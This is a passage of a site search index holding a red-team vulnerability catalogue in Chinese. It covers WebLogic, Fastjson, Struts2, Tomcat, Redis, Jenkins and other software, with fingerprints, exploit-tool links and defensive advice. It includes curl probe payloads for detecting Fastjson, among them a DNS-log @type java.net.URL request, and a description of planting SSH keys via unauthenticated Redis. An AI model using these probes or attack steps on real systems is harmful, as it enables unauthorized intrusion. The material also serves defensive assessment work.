\u76f4\u63a5\u53d1\u5305\u5373\u53ef \u6f0f\u6d1e\u590d\u73b0 Shiro\u6743\u9650\u7ed5\u8fc7\u6f0f\u6d1e\u5206\u6790\uff08CVE-2020-1957\uff09 https://www.freebuf.com/vuls/231909.html \u9632\u62a4\u65b9\u6cd5 \u5347\u7ea71.5.2\u7248\u672c\u53ca\u4ee5\u4e0a\u5c3d\u91cf\u907f\u514d\u4f7f\u7528\u901a\u914d\u7b26\u4f5c\u4e3a\u52a8\u6001\u8def\u7531\u62e6\u622a\u5668\u7684URL \u8def\u5f84\u8868\u8fbe\u5f0f.","title":"Apache shiro \u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e"},{"location":"redteam/%E6%BC%8F%E6%B4%9E%E5%BA%93/#weblogic","text":"","title":"weblogic\u76f8\u5173"},{"location":"redteam/%E6%BC%8F%E6%B4%9E%E5%BA%93/#weblogic-t3","text":"\u6f0f\u6d1e\u7b80\u4ecb Weblogic Server \u4e2d \u7684 RMI \u901a \u4fe1 \u4f7f \u7528 T3 \u534f \u8bae \u5728 Weblogic Server \u548c \u5176 \u5b83 Java \u7a0b \u5e8f \uff08 \u5ba2 \u6237 \u7aef \u6216 \u8005 \u5176 \u5b83 Weblogic Server \u5b9e \u4f8b \uff09 \u4e4b \u95f4 \u4f20 \u8f93 \u6570 \u636e , \u670d\u52a1\u5668\u5b9e\u4f8b\u4f1a\u8ddf\u8e2a\u8fde\u63a5\u5230\u5e94\u7528\u7a0b\u5e8f\u7684\u6bcf\u4e2aJava \u865a\u62df\u673a\uff08JVM \uff09\u4e2d, \u5e76 \u521b \u5efa T3 \u534f \u8bae \u901a \u4fe1 \u8fde \u63a5 , \u5c06 \u6d41 \u91cf \u4f20 \u8f93 \u5230 Java \u865a \u62df \u673a . T3 \u534f \u8bae \u5728 \u5f00 \u653e WebLogic \u63a7 \u5236 \u53f0 \u7aef \u53e3 \u7684 \u5e94 \u7528 \u4e0a \u9ed8 \u8ba4 \u5f00 \u542f . \u653b\u51fb\u8005\u53ef\u4ee5\u901a\u8fc7T3\u534f\u8bae\u53d1\u9001\u6076\u610f\u7684\u7684\u53cd\u5e8f\u5217\u5316\u6570\u636e, \u8fdb\u884c\u53cd\u5e8f\u5217\u5316, \u5b9e\u73b0\u5bf9\u5b58\u5728\u6f0f\u6d1e\u7684weblogic\u7ec4\u4ef6\u7684\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\u653b\u51fb. \u5f71\u54cd\u8303\u56f4 Weblogic 10.3.6.0.0 Weblogic 12.1.3.0.0 Weblogic 12.2.1.3.0 \u6f0f\u6d1e\u7279\u5f81 \u53ef\u4ee5\u6839\u636eweblogic\u7684\u62a5\u9519\u9875\u9762\u4f5c\u4e3a\u7279\u5f81\uff1a The server has not found anything matching the Request-URI.No indication is given of whether the condition is temporary or permanent.\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7 \u6f0f\u6d1e\u590d\u73b0 Weblogic t3\u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e(CVE-2019-2890)\u5206\u6790 http://gv7.me/articles/2019/cve-2019-2890-vulnerability-analysis/ Weblogic T3\u534f\u8bae\u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e\uff08CVE-2018-2628\uff09 https://blog.csdn.net/Aaron_Miller/article/details/106657746 \u76f8\u5173\u6f0f\u6d1e\u5305\u62ec\uff1a CVE-2017-3248 https://paper.seebug.org/333/ CVE-2018-2628 https://paper.seebug.org/985/ CVE-2018-2893 https://www.freebuf.com/vuls/178105.html CVE-2019-2890 https://paper.seebug.org/1069/ CVE-2020-2555(Oracle Coherence) https://paper.seebug.org/1141/ \u5229\u7528\u5de5\u5177 weblogic \u6f0f\u6d1e\u626b\u63cf\u5de5\u5177 https://github.com/0xn0ne/weblogicScanner \u9632\u62a4\u65b9\u6cd5 \u53ca \u65f6 \u66f4 \u65b0 \u8865 \u4e01 \u7981 \u7528 T3 \u534f \u8bae \u7981 \u6b62 T3 \u7aef \u53e3 \u5bf9 \u5916 \u5f00 \u653e , \u6216\u8005\u9650\u5236\u53ef\u8bbf\u95eeT3\u7aef\u53e3\u7684IP\u6765\u6e90 Weblogic XMLDecoder\u53cd\u5e8f\u5217\u5316 \u6f0f\u6d1e\u7b80\u4ecb WebLogic \u4e2d \u9ed8 \u8ba4 \u5305 \u542b \u7684 wls-wast \u4e0e wls9_async_response war \u5305 \uff0c \u7531 \u4e8e \u4ee5 \u4e0a WAR \u5305 \u91c7 \u7528 XMLDecoder \u53cd \u5e8f \u5217 \u5316 \u673a \u5236 \u6765 \u5904 \u7406 \u53d1 \u9001 \u8fc7 \u6765 \u7684 XML \u6570 \u636e \uff0c \u8fdc \u7a0b \u6076 \u610f \u653b \u51fb \u8005 \u53ef \u4ee5 \u901a \u8fc7 \u53d1 \u9001 \u7cbe \u5fc3 \u6784 \u9020 \u7684 HTTP \u8bf7\u6c42\uff0c\u5728\u672a\u6388\u6743\u7684\u60c5\u51b5\u4e0b\u8fdc\u7a0b\u6267\u884c\u547d\u4ee4\uff0c\u83b7\u5f97\u76ee\u6807\u670d\u52a1\u5668\u7684\u6743\u9650\u3002\u4e5f\u5c31 \u662f\u8bf4\uff0c\u653b\u51fb\u8005\u80fd\u591f\u76f4\u63a5\u83b7\u53d6\u670d\u52a1\u5668\u7cfb\u7edf\u6743\u9650\uff0c\u8fdb\u884c\u6570\u636e\u7a83\u53d6\uff0c\u8fdb\u800c\u751a\u81f3 \u4f1a\u5a01\u80c1\u53d7\u5bb3\u8005\u7684\u5185\u7f51\u5b89\u5168\u3002 \u5f71\u54cd\u8303\u56f4 Oracle WebLogic Server10.3.6.0.0 Oracle WebLogic Server12.1.3.0.0 Oracle WebLogic Server12.2.1.1.0 Oracle WebLogic Server12.2.1.3.0 \u6f0f\u6d1e\u7279\u5f81 /wls-wsat/CoordinatorPortType /async/AsyncResponseService /async/AsyncResponseServiceSoap12 \u6f0f\u6d1e\u590d\u73b0 WebLogic XMLDecoder\u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e\uff08CVE-2017-10271\uff09 https://blog.csdn.net/u013622866/article/details/104872747 WebLogic-XMLDecoder\u53cd\u5e8f\u5217\u5316\u5206\u6790 https://hu3sky.github.io/2019/10/16/weblogic/ \u5229\u7528\u5de5\u5177 weblogicScanner https://github.com/0xn0ne/weblogicScanner \u9632\u62a4\u65b9\u6cd5 \u901a\u8fc7\u8bbf\u95ee\u7b56\u7565\u63a7\u5236\u7981\u6b62\u5916\u90e8/_async/* \u53ca /wls-wsat/*\u8def\u5f84\u7684URL\u8bbf\u95ee \u5220\u9664\u5bf9\u5e94war\u5305\u5e76\u91cd\u542f webLogic \u9650\u5236\u6e90IP\u5bf9\u5e94 weblogic 7001\u7aef\u53e3\u7684\u8bbf\u95ee","title":"Weblogic T3 \u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e"},{"location":"redteam/%E6%BC%8F%E6%B4%9E%E5%BA%93/#fastjson","text":"","title":"Fastjson\u53cd\u5e8f\u5217\u5316"},{"location":"redteam/%E6%BC%8F%E6%B4%9E%E5%BA%93/#fastjson-1222-1224","text":"\u6f0f\u6d1e\u7b80\u4ecb FastJson\u662falibaba\u7684\u4e00\u6b3e\u5f00\u6e90JSON\u89e3\u6790\u5e93\uff0c\u53ef\u7528\u4e8e\u5c06Java\u5bf9\u8c61\u8f6c\u6362 \u4e3a\u5176JSON\u8868\u793a\u5f62\u5f0f\uff0c\u4e5f\u53ef\u4ee5\u7528\u4e8e\u5c06JSON\u5b57\u7b26\u4e32\u8f6c\u6362\u4e3a\u7b49\u6548\u7684Java\u5bf9 \u8c61\u3002fastjson\u5728\u89e3\u6790json\u7684\u8fc7\u7a0b\u4e2d\uff0c\u652f\u6301\u4f7f\u7528autoType\u6765\u5b9e\u4f8b\u5316\u67d0\u4e00\u4e2a \u5177 \u4f53 \u7684 \u7c7b \uff0c \u5e76 \u8c03 \u7528 \u8be5 \u7c7b \u7684 set/get \u65b9 \u6cd5 \u6765 \u8bbf \u95ee \u5c5e \u6027 \u3002 \u5728 Java 8u102\u73af\u5883\u4e0b\uff0c\u6ca1\u6709com.sun.jndi.rmi.object.trustURLCodebase\u7684\u9650 \u5236\uff0c\u53ef\u4ee5\u4f7f\u7528com.sun.rowset.JdbcRowSetImpl\u7684\u5229\u7528\u94fe\uff0c\u501f\u52a9JNDI \u6ce8\u5165\u6765\u6267\u884c\u547d\u4ee4\u3002 \u5f71\u54cd\u8303\u56f4 Fastjson 1.2.22 - 1.2.24 \u6f0f\u6d1e\u7279\u5f81 \u5982\u679c\u7ad9\u70b9\u6709\u539f\u59cb\u62a5\u9519\u56de\u663e\uff0c\u53ef\u4ee5\u7528\u4e0d\u95ed\u5408\u82b1\u62ec\u53f7\u7684\u65b9\u5f0f\u8fdb\u884c\u62a5\u9519\u56de\u663e\uff0c \u62a5 \u9519 \u4e2d \u5f80 \u5f80 \u4f1a \u6709 fastjson \u7684 \u5b57 \u6837 .(vulhub \u73af \u5883 \u4e0d \u9002 \u7528 \uff09 \u3002 curl http://10.154.7.128:8090/ -H \"Content-Type: application/json\" --data '{\"name\":\"success\", \"age\":20' \u53ef \u4ee5 \u901a \u8fc7 DNS \u56de \u663e \u7684 \u65b9 \u5f0f \u68c0 \u6d4b \u540e \u7aef \u662f \u5426 \u4f7f \u7528 Fastjson \u3002 curl http://10.154.7.128:8090/ -H \"Content-Type: application/json\" --data '{{\"@type\":\"java.net.URL\",\"val\":\"dnslog\"}:0' Java \u7cfb Json \u5904\u7406\u57fa\u672c\u53ea\u6709 Fastjson \u548c Jackson\uff0c\u8ffd\u52a0\u4e00\u4e2a\u968f\u673a key\u65f6jackson\u4f1a\u62a5\u9519\u3002 \u5bf9 \u4f7f \u7528 fastjson \u7684 \u3002 Fastjson < 1.2.60 \u5728 \u53d6 \u4e0d \u5230 \u503c \u7684 \u65f6 \u5019 \u4f1a \u586b \u5145 \\u001a , \u5728 1.2.60 \u8fdb \u884c \u4e86 \u4fee \u590d , \u5bf9 \\x \u540e \u9762 \u7684 \u5b57 \u7b26 \u8fdb \u884c \u662f \u5426 \u4e3a 16 \u8fdb \u5236 \u5141 \u8bb8 \u5b57 \u7b26 (0-9a-fA-F) \u7684\u6821\u9a8c,\u6240\u4ee5\u8fd9\u91cc\u5c31\u53ef\u4ee5\u624b\u52a8 padding ,\u6784\u9020\u4e00\u4e2a\u7279\u6b8a\u7684\u5b57\u7b26\u4e32\u3002 \u6f0f\u6d1e\u590d\u73b0 fastjson <= 1.2.24 \u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e\u5206\u6790 https://www.secpulse.com/archives/73508.html fastjson 1.2.24\u53cd\u5e8f\u5217\u5316\u5bfc\u81f4\u4efb\u610f\u547d\u4ee4\u6267\u884c\u6f0f\u6d1e\u5206\u6790\u8bb0\u5f55 https://www.cnblogs.com/tr1ple/p/11431543.html fastjson 1.2.24\u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e\u6df1\u5ea6\u5206\u6790 https://www.anquanke.com/post/id/211035 \u5982\u4f55\u5229\u7528 https://mntn0x.github.io/2020/04/07/Fastjson%E6%BC%8F%E6%B 4%9E%E5%A4%8D%E7%8E%B0/ \u9632\u62a4\u65b9\u6cd5 \u76f4\u63a5\u4e0b\u8f7d\u4e0d\u53d7\u5f71\u54cd\u7684\u65b0\u7248\u672c\u963f\u91cc\u5b98\u65b9\u5df2\u7ecf\u53d1\u5e03\u516c\u544a\uff0c\u5efa\u8bae\u53d7\u5f71\u54cd\u7684\u7528\u6237 \u7acb \u523b \u5347 \u7ea7 \u5230 1.2.28/1.2.29 \u6216\u66f4\u9ad8\u7684\u7248\u672c\uff0c\u4e0b\u8f7d\u5730\u5740\uff1a http://repo1.maven.org/maven2/com/alib aba/fastjson/1.2.29/","title":"Fastjson 1.2.22 - 1.2.24 \u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e"},{"location":"redteam/%E6%BC%8F%E6%B4%9E%E5%BA%93/#struts","text":"\u6f0f\u6d1e\u7b80\u4ecb Apache Struts2 \u4f5c \u4e3a \u4e16 \u754c \u4e0a \u6700 \u6d41 \u884c \u7684 Java Web \u670d\u52a1\u5668\u6846\u67b6\u4e4b\u4e00\uff0c\u4ece\u51fa\u73b0\u6f0f\u6d1e\u81f3\u4eca\u867d\u7136\u6709\u4e9b\u5e74\u5934\uff0c\u4f46\u662f\u4ecd\u7136\u6ca1\u6709\u6d88\u5931\u3002 \u5f71\u54cd\u7ec4\u4ef6 Struts \u6f0f\u6d1e\u590d\u73b0 Struts2 \u5386\u53f2 RCE \u6f0f\u6d1e\u56de\u987e\u4e0d\u5b8c\u5168\u7cfb\u5217 https://rickgray.me/2016/05/06/review-struts2-remote-command \ufffeexecution-vulnerabilities/ \u6d45\u8c08struts2\u5386\u53f2\u4e0a\u7684\u9ad8\u5371\u7a81\u7834 https://www.anquanke.com/post/id/86757 strut2\u5404\u7248\u672c\u6f0f\u6d1e\u4fe1\u606f\u6574\u7406 https://www.zybuluo.com/Dukebf/note/821989 \u5229\u7528\u5de5\u5177 HatBoy/Struts2-Scan https://github.com/HatBoy/Struts2-Scan Struts2\u5947\u8469\u73af\u5883\u4efb\u610f\u6587\u4ef6\u4e0a\u4f20\u5de5\u5177 https://www.cnblogs.com/k8gege/p/10261217.html \u9632\u62a4\u65b9\u6cd5 \u5347\u7ea7\u5230\u6700\u65b0\u7248\u4e0d\u5efa\u8bae\u4f7f\u7528Struts","title":"Struts\u7cfb\u5217\u6f0f\u6d1e"},{"location":"redteam/%E6%BC%8F%E6%B4%9E%E5%BA%93/#solr","text":"\u7ec4\u4ef6\u63cf\u8ff0 Apache Solr\u662f\u4e00\u4e2a\u9ad8\u5ea6\u53ef\u9760\u3001\u53ef\u4f38\u7f29\u548c\u5bb9\u9519\u7684\uff0c\u63d0\u4f9b\u5206\u5e03\u5f0f\u7d22\u5f15\u3001\u590d\u5236\u548c\u8d1f\u8f7d \u5e73\u8861\u67e5\u8be2\u3001\u81ea\u52a8\u6545\u969c\u8f6c\u79fb\u548c\u6062\u590d\u3001\u96c6\u4e2d\u914d\u7f6e\u7b49\u529f\u80fd\u7684\u5f00\u6e90\u7684\u641c\u7d22\u670d\u52a1\u5668 \u3002Solr\u4e3a\u4e16\u754c\u4e0a\u8bb8\u591a\u6700\u5927\u7684\u4e92\u8054\u7f51\u7ad9\u70b9\u63d0\u4f9b\u641c\u7d22\u548c\u5bfc\u822a\u529f\u80fd\u3002Solr \u4f7f\u7528 Java \u8bed\u8a00\u5f00\u53d1\uff0c\u4e3b\u8981\u57fa\u4e8e HTTP \u548c Apache Lucene \u5b9e\u73b0\u3002Apache Solr \u4e2d \u5b58 \u50a8 \u7684 \u8d44 \u6e90 \u662f \u4ee5 Document \u4e3a\u5bf9\u8c61\u8fdb\u884c\u5b58\u50a8\u7684\u3002\u6bcf\u4e2a\u6587\u6863\u7531\u4e00\u7cfb\u5217\u7684 Field \u6784\u6210\uff0c\u6bcf\u4e2a Field \u8868 \u793a \u8d44 \u6e90 \u7684 \u4e00 \u4e2a \u5c5e \u6027 \u3002 Solr \u4e2d \u7684 \u6bcf \u4e2a Document \u9700\u8981\u6709\u80fd\u552f\u4e00\u6807\u8bc6\u5176\u81ea\u8eab\u7684\u5c5e\u6027\uff0c\u9ed8\u8ba4\u60c5\u51b5\u4e0b\u8fd9\u4e2a\u5c5e\u6027\u7684\u540d\u5b57\u662f id\uff0c\u5728 Schema \u914d\u7f6e\u6587\u4ef6\u4e2d\u4f7f\u7528\uff1a id \u5f71\u54cd\u7ec4\u4ef6 solr \u6f0f\u6d1e\u590d\u73b0 Solr\u7cfb\u5217\u6f0f\u6d1e\u590d\u73b0 https://www.jianshu.com/p/43e7f13e2058 \u5229\u7528\u5de5\u5177 k8gege/SolrExp https://github.com/k8gege/SolrExp 1135/solr_exploit https://github.com/1135/solr_exploit \u9632\u62a4\u65b9\u6cd5 \u5347\u7ea7\u5230\u6700\u65b0\u7248\u4e0d\u8981\u5bf9\u5916\u5f00\u653e\u654f\u611f\u7aef\u53e3","title":"Solr\u7cfb\u5217"},{"location":"redteam/%E6%BC%8F%E6%B4%9E%E5%BA%93/#tomcat","text":"","title":"Tomcat\u7c7b"},{"location":"redteam/%E6%BC%8F%E6%B4%9E%E5%BA%93/#tomcat-cve-2020-1938","text":"\u6f0f\u6d1e\u7b80\u4ecb Tomcat \u662f \u5e38 \u89c1 \u7684 Web \u5bb9 \u5668 , \u7528 \u6237 \u91cf \u975e \u5e38 \u5de8 \u5927 , Tomcat 8009 ajp\u7aef\u53e3\u4e00\u76f4\u662f\u9ed8\u8ba4\u5f00\u653e\u7684 \u5f71\u54cd\u8303\u56f4 Apache Tomcat 6 Apache Tomcat 7 < 7.0.100 Apache Tomcat 8 < 8.5.51 Apache Tomcat 9 < 9.0.31 \u6f0f\u6d1e\u7279\u5f81 tomcat/8009/ajp \\x04\\x01\\xf4\\x00\\x15 \u6f0f\u6d1e\u590d\u73b0 CVE-2020-1938 \u5e7d \u7075 \u732b ( GhostCat ) Tomcat-Ajp \u534f\u8bae\u4efb\u610f\u6587\u4ef6\u8bfb\u53d6/JSP\u6587\u4ef6\u5305\u542b\u6f0f\u6d1e\u5206\u6790 https://www.guildhab.top/?p=2406 Apache Tomcat\u6587\u4ef6\u5305\u542b\u6f0f\u6d1e\u5206\u6790 https://yinwc.github.io/2020/03/01/CVE-2020-1938/ CVE-2020-1938:Tomcat AJP\u534f\u8bae\u6587\u4ef6\u5305\u542b\u6f0f\u6d1e\u5206\u6790 http://gv7.me/articles/2020/cve-2020-1938-tomcat-ajp-lfi/ \u68c0\u6d4b\u5de5\u5177 bkfish/CNVD-2020-10487-Tomcat-Ajp-lfi-Scanner https://github.com/bkfish/CNVD-2020-10487-Tomcat-Ajp-lfi \ufffeScanner \u957f\u4ead\u79d1\u6280\u68c0\u6d4b\u5de5\u5177 https://www.chaitin.cn/zh/ghostcat#download \u9632\u62a4\u65b9\u6cd5 \u66f4\u65b0\u4e3a\u6700\u65b0\u7248\u672c \u82e5 \u4e0d \u9700 \u8981 \u4f7f \u7528 Tomcat AJP \u534f \u8bae \uff0c \u53ef \u76f4 \u63a5 \u5173 \u95ed AJP Connector\uff0c\u6216\u5c06\u5176\u76d1\u542c\u5730\u5740\u6539\u4e3a\u4ec5\u76d1\u542c\u672c\u673alocalhost\u3002 CVE-2020-9484 tomcat","title":"Tomcat \u672c\u5730\u6587\u4ef6\u5305\u542b\u6f0f\u6d1e (CVE-2020-1938)"},{"location":"redteam/%E6%BC%8F%E6%B4%9E%E5%BA%93/#session","text":"\u6f0f\u6d1e\u7b80\u4ecb Apache Tomcat\u53d1\u5e03\u901a\u544a\u79f0\u4fee\u590d\u4e86\u4e00\u4e2a\u6e90\u4e8e\u6301\u4e45\u5316Session\u7684\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\u6f0f\u6d1e \uff08CVE-2020-9484\uff09\u3002 \u6f0f\u6d1e\u6761\u4ef6\u6bd4\u8f83\u82db\u523b\uff1a tomcat\u5fc5\u987b\u542f\u7528session\u6301\u4e45\u5316\u529f\u80fdFileStore tomcat/lib \u6216 \u8005 WEB-INF/lib \u76ee \u5f55 \u4e0b \u7684 \u4f9d \u8d56 \u5b58 \u5728 \u53ef \u7528 \u7684 gadget 3. \u5728\u670d\u52a1\u5668\u4e0a\u5b58\u5728\u5df2\u77e5\u8def\u5f84\u6587\u4ef6\u5185\u5bb9\u53ef\u63a7 \u5f71\u54cd\u8303\u56f4 Apache Tomcat 10.x < 10.0.0-M5 Apache Tomcat 9.x < 9.0.35 Apache Tomcat 8.x < 8.5.55 Apache Tomcat 7.x < 7.0.104 \u6f0f\u6d1e\u4f9d\u8d56\u6761\u4ef6 \u914d\u7f6esession\u6301\u4e45\u5316 conf/context.xml \u90e8\u7f72Gadgets jar\u5305 \u4e0b\u8f7dcommons-collections4-4.0.jar \u5e76\u653e\u5728tomcat lib/\u76ee\u5f55\u4e0b \u6f0f\u6d1e\u590d\u73b0 CVE-2020-9484 tomcat session\u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e\u5206\u6790\u4e0e\u590d\u73b0 https://www.cnblogs.com/potatsoSec/p/12931427.html CVE-2020-9484 tomcat session\u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e\u5206\u6790\u4e0e\u590d\u73b0 https://blog.csdn.net/Jietewang/article/details/106462903 \u6f0f\u6d1e\u5229\u7528 tomcat-cluster-session-sync-exp https://github.com/threedr3am/tomcat-cluster-session-sync-exp \u9632\u62a4\u65b9\u6cd5 Apache Tomcat\u5b98\u65b9\u5df2\u7ecf\u53d1\u5e03\u65b0\u7248\u672c\u4fee\u590d\u4e0a\u8ff0\u6f0f\u6d1e\uff0c\u5efa\u8bae\u53d7\u5f71\u54cd\u7528\u6237\u5c3d\u5feb\u5347\u7ea7 \u8fdb\u884c\u9632\u62a4\u3002\u4e0d\u65b9\u4fbf\u5347\u7ea7\u7684\u7528\u6237\uff0c\u8fd8\u53ef\u4ee5\u6682\u65f6\u7981\u7528FileStore\u529f\u80fd\uff0c\u6216\u8005 \u5355\u72ec\u914d\u7f6esessionAttributeValueClassNameFilte\u7684\u503c\u6765\u786e\u4fdd\u53ea\u6709\u7279\u5b9a \u5c5e\u6027\u7684\u5bf9\u8c61\u53ef\u4ee5\u88ab\u5e8f\u5217\u5316/\u53cd\u5e8f\u5217\u5316\u3002","title":"session\u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e\u5206\u6790"},{"location":"redteam/%E6%BC%8F%E6%B4%9E%E5%BA%93/#redis","text":"\u6f0f\u6d1e\u7b80\u4ecb \u90e8\u5206 Redis \u7ed1\u5b9a\u5728 0.0.0.0:6379 \uff0c\u5e76\u4e14\u6ca1\u6709\u5f00\u542f\u8ba4\u8bc1\uff08\u8fd9\u662f Redis \u7684\u9ed8\u8ba4\u914d\u7f6e\uff09\uff0c\u5982\u679c\u6ca1\u6709\u8fdb\u884c\u91c7\u7528\u76f8\u5173\u7684\u7b56\u7565\uff0c\u6bd4\u5982\u6dfb\u52a0\u9632\u706b\u5899\u89c4\u5219\u907f \u514d \u5176 \u4ed6 \u975e \u4fe1 \u4efb \u6765 \u6e90 ip \u8bbf \u95ee \u7b49 \uff0c \u5c06 \u4f1a \u5bfc \u81f4 Redis \u670d\u52a1\u76f4\u63a5\u66b4\u9732\u5728\u516c\u7f51\u4e0a\uff0c\u5bfc\u81f4\u5176\u4ed6\u7528\u6237\u53ef\u4ee5\u76f4\u63a5\u5728\u975e\u6388\u6743\u60c5\u51b5\u4e0b\u76f4\u63a5\u8bbf \u95ee Redis \u670d\u52a1\u5e76\u8fdb\u884c\u76f8\u5173\u64cd\u4f5c\u3002\u5229\u7528 Redis \u81ea\u8eab\u7684\u63d0\u4f9b\u7684 config \u547d\u4ee4\uff0c\u53ef\u4ee5\u8fdb\u884c\u5199\u6587\u4ef6\u64cd\u4f5c\uff0c\u653b\u51fb\u8005\u53ef\u4ee5\u6210\u529f\u5c06\u81ea\u5df1\u7684\u516c\u94a5\u5199\u5165\u76ee\u6807\u670d \u52a1 \u5668 \u7684 /root/.ssh \u6587 \u4ef6 \u5939 \u7684 authotrized_keys \u6587\u4ef6\u4e2d\uff0c\u8fdb\u800c\u53ef\u4ee5\u76f4\u63a5\u4f7f\u7528\u5bf9\u5e94\u7684\u79c1\u94a5\u767b\u5f55\u76ee\u6807\u670d\u52a1\u5668\u3002 \u5f71\u54cd\u7ec4\u4ef6 Redis \u6f0f\u6d1e\u7279\u5f81 6379\u7aef\u53e3 \u6f0f\u6d1e\u590d\u73b0 Redis \u672a\u6388\u6743\u8bbf\u95ee\u6f0f\u6d1e\u5229\u7528\u603b\u7ed3 http://www.alloyteam.com/2017/07/12910/ Redis\u672a\u6388\u6743\u8bbf\u95ee\u6f0f\u6d1e\u603b\u7ed3 https://fragrant10.github.io/2019/02/13/Redis%E6%9C%AA%E6%8 E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6 %B4%9E%E6%80%BB%E7%BB%93.html \u590d\u73b0\u5751\u70b9\u5206\u6790 redis\u6f0f\u6d1e\u5229\u7528 https://www.jianshu.com/p/2f56a58a1450 redis 4.x/5.x\u672a\u6388\u6743\u8bbf\u95ee\u6f0f\u6d1e\uff08\u4ee5\u53ca\u4e00\u4e9b\u73af\u5883\u642d\u5efa\u7684\u5751\uff09(7\u670818\u66f4\u65b0\uff09 http://www.mucn.site/index.php/Termux/210.html \u9632\u62a4\u65b9\u6cd5 redis\u6570\u636e\u5e93\u6f0f\u6d1e\u9632\u62a4 https://www.cnblogs.com/rinack/p/11099854.html redis\u672a\u6388\u6743\u8bbf\u95ee\u6f0f\u6d1e\u7684\u5229\u7528\u548c\u9632\u62a4 https://carey.akhack.com/2020/05/07/Redis%E6%9C%AA%E6%8E %88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6% B4%9E%E7%9A%84%E5%88%A9%E7%94%A8%E5%92%8C%E9 %98%B2%E6%8A%A4/","title":"Redis\u76f8\u5173"},{"location":"redteam/%E6%BC%8F%E6%B4%9E%E5%BA%93/#zabbix","text":"\u6f0f\u6d1e\u7b80\u4ecb Zabbix\u7ec4\u4ef6\u4e3b\u8981\u5b58\u5728\u6ce8\u5165/\u5f31\u53e3\u4ee4/\u547d\u4ee4\u6267\u884c\u7b49\u7c7b\u578b\u7684\u6f0f\u6d1e\u3002 \u5f71\u54cd\u7ec4\u4ef6 Zabbix \u6f0f\u6d1e\u590d\u73b0\uff1a \u4fe1\u606f\u6536\u96c6 - Zabbix - \u6f0f\u6d1e - \u6c47\u603b https://www.cnblogs.com/AtesetEnginner/p/12641747.html Zabbix\uff08\u5206\u5e03\u5f0f\u7cfb\u7edf\u76d1\u89c6\uff09\u6f0f\u6d1e\u5b66\u4e60 https://www.jianshu.com/p/85e3b0266158 \u8bb0\u4e00\u6b21zabbix\u5b89\u88c5\u53ca\u6f0f\u6d1e\u5229\u7528getshell\u5168\u8fc7\u7a0b https://xz.aliyun.com/t/6874 Zabbix \u6700\u65b0 SQL \u6ce8\u5165\u6f0f\u6d1e\u53ca EXP \u2013 Jamin Zhang https://jaminzhang.github.io/security/Zabbix-latest-SQL-Injection \ufffeVulnerability-and-EXP/ \u6700\u65b0Zabbix\u6f0f\u6d1e\u53ca\u5176\u5229\u7528\u59ff\u52bf\uff08\u9644EXP\uff09 https://zhuanlan.zhihu.com/p/22082375 \u9632\u62a4\u65b9\u6cd5 https://www.bbsmax.com/A/QV5ZqlDeJy/","title":"Zabbix\u76f8\u5173"},{"location":"redteam/%E6%BC%8F%E6%B4%9E%E5%BA%93/#jenkins","text":"\u6f0f\u6d1e\u7b80\u4ecb Jenkins \u662f \u5e38 \u89c1 \u7684 CI/CD \u670d \u52a1 \u5668 , \u6700\u5e38\u89c1\u7684\u5c31\u662f\u7206\u7834\u5f31\u53e3\u4ee4\u7136\u540e\u4f7f\u7528groovy\u6267\u884c\u547d\u4ee4 \u5f71\u54cd\u7ec4\u4ef6 Jenkins \u6f0f\u6d1e\u7279\u5f81 Jenkins \u6f0f\u6d1e\u590d\u73b0 Jenkins\u6f0f\u6d1e\u96c6\u5408\u590d\u73b0 https://misakikata.github.io/2020/03/Jenkins%E6%BC%8F%E6%B4 %9E%E9%9B%86%E5%90%88%E5%A4%8D%E7%8E%B0/ Jenkins\u4efb\u610f\u6587\u4ef6\u8bfb\u53d6\u6f0f\u6d1e\u5206\u6790 https://www.freebuf.com/news/178808.html \u6f0f\u6d1e\u5229\u7528 blackye/Jenkins: Jenkins\u6f0f\u6d1e\u63a2\u6d4b\u3001\u7528\u6237\u6293\u53d6\u7206\u7834 https://github.com/blackye/Jenkins gquere/pwn_jenkins: Notes about attacking Jenkins servers https://github.com/gquere/pwn_jenkins Jenkins\u810f\u725b\u6f0f\u6d1eFRP\u5185\u7f51\u63d0\u6743 https://www.freebuf.com/articles/web/215183.html \u5229\u7528\u6280\u5de7 \u53ef \u4ee5 \u5728 Jenkins \u5904 \u8fdb \u884c \u5185 \u7f51 \u4fe1 \u606f \u6536 \u96c6 , \u83b7\u53d6\u7684\u8d26\u53f7\u901a\u5e38\u4e5f\u662f\u5f00\u53d1/\u8fd0\u7ef4\u7ea7\u522b\u7684, \u6743\u9650\u76f8\u5bf9\u8f83\u5927\u3002 \u9632\u62a4\u65b9\u6cd5 \u8bbe\u7f6e\u5f3a\u53e3\u4ee4\u5c3d\u91cf\u4e0d\u8981\u5f00\u653e\u5230\u516c\u7f51\u9650\u5236\u6765\u6e90IP\u5347\u7ea7\u5230\u6700\u65b0\u7248","title":"Jenkins\u76f8\u5173"},{"location":"redteam/%E6%BC%8F%E6%B4%9E%E5%BA%93/#kibana","text":"","title":"Kibana\u76f8\u5173"},{"location":"redteam/%E6%BC%8F%E6%B4%9E%E5%BA%93/#kibanacve-2019-7609","text":"\u6f0f\u6d1e\u7b80\u4ecb Kibana \u662f\u4e3a Elasticsearch\u8bbe\u8ba1\u7684\u5f00\u6e90\u5206\u6790\u548c\u53ef\u89c6\u5316\u5e73\u53f0\u3002\u4f60\u53ef\u4ee5\u4f7f\u7528 Kibana \u6765 \u641c \u7d22 \uff0c \u67e5 \u770b \u5b58 \u50a8 \u5728 Elasticsearch \u7d22\u5f15\u4e2d\u7684\u6570\u636e\u5e76\u4e0e\u4e4b\u4ea4\u4e92\u3002\u4f60\u53ef\u4ee5\u5f88\u5bb9\u6613\u5b9e\u73b0\u9ad8\u7ea7\u7684\u6570\u636e\u5206\u6790\u548c\u53ef\u89c6\u5316 